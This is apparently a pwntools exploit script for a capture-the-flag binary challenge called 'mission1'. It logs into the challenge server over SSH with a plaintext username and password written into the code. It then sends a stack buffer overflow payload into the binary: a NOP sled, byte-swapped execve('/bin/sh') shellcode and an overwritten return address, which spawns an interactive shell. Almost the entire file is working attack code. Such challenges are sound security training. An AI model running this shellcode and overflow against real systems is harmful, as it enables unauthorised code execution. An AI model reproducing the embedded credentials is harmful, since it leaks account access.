from pwn import *
from math import ceil

def swap_every(val, every):
    result = b''
    for i in range(ceil(len(val)/every/2)):
        i *= 2
        result += val[every*(i+1):every*(i+2)]
        result += val[every*i:every*(i+1)]
        # print(i, result)
    return result

shell = ssh('m963091', 'bin.chall.necst.it', password='andreahuang15021997', port=22)

# print(shell["cd mission1; pwd"])
p = shell.process(["strace", "-o", "strace.out", "./mission1"], cwd="/home/m963091/mission1/writable")
# p = shell.process("./mission1", cwd="/home/m963091/mission1/")
# sh = shell.process('./mission1/mission1')
# sh = shell.run('sh')

# run the program
# sh.sendline(b'cd mission1; ./mission1')

# prepare the exploit

buffer_addr = 0xffffc4ab + 0
shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/s\hh"
shellcode_reversed = swap_every(shellcode, 1)
# print(shellcode_reversed)
payload = b"\x90"*206 + shellcode_reversed + b"\x90"*21 + p32(buffer_addr)
# print(payload.decode("utf-8"))

complete = b"\x90"*206 + b"\x1f\xeb\x89\x5e\x08\x76\xc0\x31\x46\x88\x89\x07\x0c\x46\x0b\xb0\xf3\x89\x4e\x8d\x8d\x08\x0c\x56\x80\xcd\xdb\x31\xd8\x89\xcd\x40\xe8\x80\xff\xdc\xff\xffb/nis/hh" + b"\x90"*21 + b"\xab\xc4\xff\xff"
# send the exploit
sh = shell.run('sh')
sh.sendline(b'echo ' + complete + b' > ./mission1/writable/pwntools_exploit.txt')    
sh.sendline(b'(cat ./mission1/writable/pwntools_exploit.txt; cat ) | ./mission1/mission1')    
sh.interactive()
# p.sendline(complete)
# p.interactive()


